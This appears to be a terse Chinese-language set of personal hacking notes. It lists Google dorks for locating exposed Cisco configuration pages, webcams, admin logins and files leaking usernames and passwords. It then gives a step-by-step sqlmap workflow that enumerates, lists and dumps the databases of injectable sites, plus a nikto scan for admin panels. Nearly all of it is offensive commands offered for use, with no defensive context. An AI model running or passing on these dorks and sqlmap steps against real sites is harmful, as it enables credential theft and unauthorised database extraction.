#google搜索  
+关键字（需要） -（需要屏蔽的关键字）-（需要屏蔽的关键字）  
+北京php -上学堂  

关键字搜索和过滤。  

"精确搜索"  "字符串"  

intitle 后台登录  
intext 电话  
intext 法人  
intitle 后台登陆 intext:电话  

site:alibaba.com  inurl:contact 搜索在此网站内的某些字段。  
sox filetype:pdf  搜索到此文件的pdf格式  
payment site:cn 搜索带有payment页面。  

inurl:"level/15/exec/-/show" 搜索思科设备的配置管理界面  
intitle:"netbotz" "ok" 搜索网络摄像头  
inurl:/admin/login.php 搜索包含admin和login的网络地址  
inurl:qq.txt 搜索QQ文本。  
filetype:xls"username|password" 搜索一个文本，文本内包含用户名和密码  

inurl:ftp "password" filetype:xls site:baidu.com  
inurl:server.pwd 搜索frontpage漏洞，并暴露出帐号和密码  
http://exploit-db.com/google-dorks 谷歌语法大全  

https://www.yandex.com 俄罗斯搜索引擎  



#查询语法  
公司 url:asp?id=  

#查询该网站数据库  
sqlmap -u 网址 --dbs --current-user  

#拆解数据库  
sqlmap -u 网址 --tables	当出现报错信息时，使用默认字典进行爆破攻击。  

#查询表内字段  
sqlmap -u 网址 -T 表名 --columns 	查询-T表名内的字段信息  

#查询具体信息  
sqlmap -u 网址 -T 表名 -C 字段名1，字段名2  --dump  

nikto -host 网址		寻找管理后台  

